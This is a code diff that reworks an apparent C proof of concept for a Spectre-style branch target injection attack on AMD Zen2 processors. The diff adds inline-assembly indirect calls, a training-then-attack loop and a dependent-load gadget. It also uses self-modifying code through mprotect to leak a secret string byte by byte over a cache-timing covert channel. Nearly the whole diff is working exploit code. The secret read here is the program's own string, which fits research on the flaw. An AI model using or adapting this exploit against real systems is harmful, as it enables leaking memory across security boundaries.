@@ -13,6 +13,17 @@
 #include <string.h>
 #include <x86intrin.h>
 
+#include <unistd.h>
+#include <sys/mman.h>
+
+
+enum training_mode {
+	TRAIN,
+	ATTACK,
+};
+
+#define RET 0xC3
+
 /* The rdtscp in itself takes about 60 cycles on Zen2 */
 #define CACHE_HIT_THRESHOLD 80
 /* Covert channel */
@@ -21,36 +32,39 @@
 #define NUM_ELEMENTS 256
 uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];
 
-uint64_t *target;
-
 char *secret = "L Lag gaye";
 
-int malicious_target(char *secret) {
+void indirect_call(void **pointer_to_target, void *secret, void *covert_channel)
+{
+	__asm__ (
+		"mov %1, %%rdi \n\t"
+		"mov %2, %%rsi \n\t"
+		"clflush (%0) \n\t"
+		"mov (%0), %%rax \n\t"
+		"call *(%%rax) \n\t"
+		:
+		:"r"(pointer_to_target), "r"(secret), "r"(covert_channel)
+		:"rax","rdi","rsi"
+	);
+}
+
+void malicious_target(void *secret, void *covert_channel) {
   /* A dependant load where the index into the covert channel is dependant on
    * the secret.
    */
-  return covert_channel[*secret * ELEMENT_PADDING];
+  __asm__("1:"
+          "movzxb (%0), %%eax \n\t"
+          "shl $9, %%rax \n\t"
+          "add %1, %%rax \n\t"
+          "movq (%%rax), %%rbx \n\t"
+          "jmp 1b \n\t"
+          :
+          : "r"(secret), "r"(covert_channel)
+          : "rax", "rbx");
 }
 
-int intended_target(char *secret) { return 2; }
-
-int victim(char *addr) {
-  int result;
-  int junk = 0;
-
-  /* The branch history needs to be cleared be curated, in reality, the
-   * attacker would execute the sequence that matches the victim's branch
-   * history. On AMD client Zen2, this needs exactly 32 iterations.
-   */
-  for (int i = 0; i < 32; i++) {
-    result += i;
-  }
-  __asm volatile("callq *%1\n"
-                 "mov %%eax, %0\n"
-                 : "=r"(result)
-                 : "r"(*target)
-                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
-  return result & junk;
+void benign_target(void* a, void* b)
+{
 }
 
 void flush_covert_channel() {
@@ -59,53 +73,48 @@ void flush_covert_channel() {
   _mm_mfence();
 }
 
+char make_writable(void *page)
+{
+	return mprotect((void *)((long)page & (~0xfff)), 256, PROT_READ | PROT_WRITE | PROT_EXEC);
+}
+
 void read_byte_from_channel(char *secret_addr, char secret_value[2],
                             int score[2]) {
   volatile int result;
   int hits[NUM_ELEMENTS];
-  char decoy = '$';
   int winner, runner_up;
+
+  enum training_mode training_sequence[6] = {
+	TRAIN,
+	TRAIN,
+	TRAIN,
+	TRAIN,
+	TRAIN,
+	ATTACK
+  };
+  uint8_t first_byte_of_malicious_target = *(uint8_t *)(malicious_target);
+  void (*target)(void*, void*) = NULL;
+  void *pointer_to_target = (void *)(&target);
 
   for (int i = 0; i < NUM_ELEMENTS; i++) {
     hits[i] = 0;
-    covert_channel[i * ELEMENT_PADDING] = 1;
+    covert_channel[i * ELEMENT_PADDING] = 0;
   }
 
   for (int iter = 0; iter < 1000; iter++) {
-    /* Poison the target and execute the victim.
-     * Ideally this would be a different target that aliases in the BTB
-     * with the target we want to poison.
-     */
-    *target = (uint64_t)&malicious_target;
-    /* Wait for the load to complete */
-    _mm_mfence();
-
-    result ^= victim(&decoy);
-
-    /* A defensive mfence */
-    _mm_mfence();
-
-    /* We have architecturally called the poisoned target, this is cheating,
-     * remove the effects of this from the cache. Ideally one would execute an
-     * indirect call that aliases with the indirect call in the BTB
-     *
-     * PS: AMD calls the BHB as the BTB and the indirect predictor is called
-     * Indirect Target Array.
-     */
     for (int i = 0; i < NUM_ELEMENTS; i++)
       _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
-    _mm_mfence();
 
-    *target = (uint64_t)&intended_target;
-    _mm_mfence();
-
-    /* Flush the target so that the CPU speculates to the malicious target
-     * longer */
-    _mm_clflush((void *)target);
-    _mm_mfence();
-
-    result ^= victim(secret_addr);
-    _mm_mfence();
+    for (int i = 0; i < 6; i++) {
+      if (training_sequence[i] == ATTACK) {
+        *(uint8_t *)(malicious_target) = first_byte_of_malicious_target;
+        target = benign_target;
+      } else {
+        *(uint8_t *)(malicious_target) = RET;
+        target = malicious_target;
+      }
+      indirect_call(&pointer_to_target, secret_addr, covert_channel);
+    }
 
     for (int i = 0; i < NUM_ELEMENTS; i++) {
       uint64_t start, elapsed;
@@ -157,12 +166,12 @@ void set_cpu_affinity() {
 int main() {
   set_cpu_affinity(); // Pin execution to CPU 0 for accuracy
 
-  target = (uint64_t *)malloc(sizeof(uint64_t));
   char result[2];
   int score[2];
   int probe_len = strlen(secret);
   char *probe_addr = secret;
 
+  make_writable(malicious_target);
   printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
   while (--probe_len >= 0) {
     printf("reading %p...", probe_addr);
@@ -174,5 +183,4 @@ int main() {
            (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
   }
   printf("\n");
-  free(target);
 }
